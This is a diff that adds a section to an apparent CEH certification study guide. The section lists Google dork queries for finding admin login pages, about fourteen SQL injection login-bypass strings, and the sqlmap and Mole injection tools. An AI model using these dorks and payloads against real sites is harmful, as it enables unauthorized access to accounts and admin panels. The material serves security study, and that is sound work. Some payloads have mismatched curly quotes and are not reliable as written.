@@ -69,4 +69,38 @@
   - Thus, it is considered more secure than HTTP GET. HTTP POST requests can also pass large amounts of data to the server.
   - They are ideal for communicating with an XML web service.
 
+## Google Dorks for finding the Login Pages
+For example, the attacker may try the following dorks to find the admin panel of a website: 
+- inurl:adminlogin.aspx 
+- inurl:admin/index.php
+- inurl:administrator.php
+- inurl:administrator.asp
+- inurl:login.asp
+- inurl:login.aspx
+- inurl:login.php
+- inurl:admin/index.php
+- inurl:adminlogin.aspx
+
+**Once you found the login page, you can try injecting these malicious SQL queries**
+- ‘ or 1=1 --
+- 1'or’1'=’1
+- admin’--
+- ” or 0=0 --
+- or 0=0 --
+- ‘ or 0=0 #
+- ” or 0=0 #
+- or 0=0 #
+- ‘ or ‘x’='x
+- ” or “x”=”x
+- ‘) or (‘x’='x
+- ‘ or 1=1--
+- ” or 1=1--
+- or 1=1--
+
+## Tools
+- SQL map, source: https://sqlmap.org
+- Mole Source: https://sourceforge.net
+  - Mole is an automatic SQL injection exploitation tool.
+  - Only by providing a vulnerable URL and a valid string on the site, it can detect the injection and exploit it using the union technique or a Boolean query-         based technique.
+
 ### [Table Of Contents](https://karsyboy.github.io/CEHv10_Ultimate_Study_Guide/)
